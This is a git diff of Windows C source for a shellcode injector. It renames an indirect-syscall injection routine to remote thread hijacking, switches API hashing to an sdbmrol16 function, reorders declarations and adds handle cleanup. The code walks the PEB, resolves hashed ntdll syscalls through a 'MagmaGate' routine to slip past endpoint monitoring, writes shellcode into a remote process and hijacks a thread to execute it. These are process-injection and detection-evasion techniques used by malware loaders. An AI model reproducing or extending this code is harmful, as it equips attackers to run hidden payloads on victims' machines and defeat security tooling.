@@ -12,8 +12,8 @@ BOOL CreateSuspendedProcess
 )
 {
 
-	BOOL State = TRUE;
-	STARTUPINFOA StartupInfo;
+	BOOL				State = TRUE;
+	STARTUPINFOA		StartupInfo;
 	PROCESS_INFORMATION ProcessInfo;
 
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
@@ -49,30 +49,32 @@ CLEANUP:
 }
 
 
-BOOL IndirectSyscallInjection
-(IN HANDLE hProcess,
-	IN PBYTE pShellcode,
-	IN SIZE_T sSizeOfShellcode,
-	OUT PVOID* ppAddress)
+BOOL RemoteThreadHijack
+(
+	IN	HANDLE	hProcess,
+	IN	PBYTE	pShellcode,
+	IN	SIZE_T	sSizeOfShellcode,
+	OUT PVOID*	ppAddress
+)
 
 {
 
-	SIZE_T sBytesWritten = NULL;
-	DWORD dwOldProt = NULL;
-	PVOID rBuffer = NULL;
-	NTSTATUS STATUS = NULL;
-	PUCHAR localBuf = NULL;
-	SIZE_T origSize = sSizeOfShellcode;
-	SIZE_T regionSize = sSizeOfShellcode;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
-
-
 	if (!hProcess || !pShellcode || sSizeOfShellcode == 0 || !ppAddress) {
-		WARN("Invalid parameter to IndirectSyscallInjection");
+		WARN("Invalid parameter to Remote Thread Hijacking");
 		return FALSE;
 	}
+
+	SIZE_T					sBytesWritten		= 0;
+	DWORD					dwOldProt			= 0;
+	NTSTATUS				STATUS				= STATUS_SUCCESS;
+	PVOID					rBuffer				= NULL;
+	PUCHAR					localBuf			= NULL;
+	SIZE_T					origSize			= sSizeOfShellcode;
+	SIZE_T					regionSize			= sSizeOfShellcode;
+	PIMAGE_EXPORT_DIRECTORY pImgDir				= NULL;
+	SYSCALL_INFO			info				= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[3]		= { 0 };
+
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -100,10 +102,8 @@ BOOL IndirectSyscallInjection
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -174,26 +174,25 @@ BOOL IndirectSyscallInjection
 BOOL HijackThread
 (
 	IN HANDLE hThread,
-	IN PVOID pRemoteAddress
+	IN PVOID  pRemoteAddress
 )
 
 {
-
-	NTSTATUS		STATUS = NULL;
-	ULONG suspendedCount = 0;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
-
-	CONTEXT ThreadCtx;
-	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
-	ThreadCtx.ContextFlags = CONTEXT_FULL;
-
 
 	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pRemoteAddress) {
 		WARN("Invalid parameters to HijackThread");
 		return FALSE;
 	}
+
+	NTSTATUS				STATUS			= STATUS_SUCCESS;
+	ULONG					suspendedCount	= 0;
+	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
+	SYSCALL_INFO			info			= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[4] = { 0 };
+
+	CONTEXT ThreadCtx;
+	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
+	ThreadCtx.ContextFlags = CONTEXT_FULL;
 
 
 	HMODULE ntdll = WalkPeb();
@@ -223,10 +222,8 @@ BOOL HijackThread
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -283,6 +280,14 @@ BOOL HijackThread
 
 	INFO("Waiting for Thread to Finish Executing...");
 
+
+CLEANUP:
+
+	if (pRemoteAddress)
+		VirtualFree(pRemoteAddress, 0, MEM_RELEASE);
+
+	if (hThread)
+		CloseHandle(hThread);
 
 	return TRUE;
 }
